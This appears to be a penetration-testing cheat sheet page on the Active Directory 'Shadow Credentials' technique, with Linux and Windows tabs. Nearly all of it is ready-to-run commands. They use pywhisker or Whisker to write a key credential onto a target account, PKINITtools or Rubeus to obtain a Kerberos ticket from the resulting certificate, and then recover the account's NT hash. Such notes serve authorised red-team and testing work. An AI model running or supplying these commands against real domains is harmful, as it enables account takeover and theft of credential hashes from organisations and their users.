---
title: "AddKeyCredentialLink"
date: 2024-7-31
tags: ["Shadow Credentials", "Pass-The-Cert", "AddkeyCredentialLink", "Active Directory", "Windows", "Whisker", "Pywhisker"]
---

### Privesc #1: Shadow credentials

{{< tab set1 tab1 active >}}Linux{{< /tab >}}
{{< tab set1 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 0. Pre-check \[optional\]

```console
python3 pywhisker.py --action list -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --dc-ip <DC> -t '<TARGET_USER>' --use-ldaps
```

#### 1. Add shadow credentials

```console
python3 pywhisker.py --action add -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --dc-ip <DC> -t '<TARGET_USER>' --use-ldaps
```

<br>

```console
# Fix module 'OpenSSL.crypto' has no attribute 'PKCS12Type'
pip3 install -I pyopenssl==24.0.0
```

#### 2. Request TGT using the PFX

```console
sudo ntpdate -s <DC> && python3 gettgtpkinit.py -cert-pfx <PFX_FILE> -pfx-pass '<GENERATED_PASSWORD>' '<DOMAIN>/<TARGET_USER>' <TARGET_USER>.ccache -dc-ip <DC>
```

#### 3. Get NT hash

```console
export KRB5CCNAME=<TARGET_USER>.ccache
```

```console
python3 getnthash.py '<DOMAIN>/<TARGET_USER>' -key <AS_REP_ENC_KEY>
```

<small>*Ref: [pywhisker](https://github.com/ShutdownRepo/pywhisker)*</small>
<br>
<small>*Ref: [PKINITtools](https://github.com/dirkjanm/PKINITtools)*</small>

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### 0. Pre-check \[optional\]

```console
.\whisker.exe list /domain:<DOMAIN> /target:'<TARGET_USER>' /dc:<DC>
```

#### 1. Add shadow credentials

```console
.\whisker.exe add /domain:<DOMAIN> /target:'<TARGET_USER>' /dc:<DC> /password:'<PFX_PASSWORD>'
```

#### 2. Request TGT using PFX file and get NTLM hash

```console
.\rubeus.exe asktgt /user:'<TARGET_USER>' /certificate:<BASE64_PFX> /password:'<PFX_PASSWORD>' /domain:<DOMAIN> /dc:<DC> /getcredentials /show
```

<small>*Ref: [Whisker.exe](https://github.com/eladshamir/Whisker)*</small>

{{< /tabcontent >}}
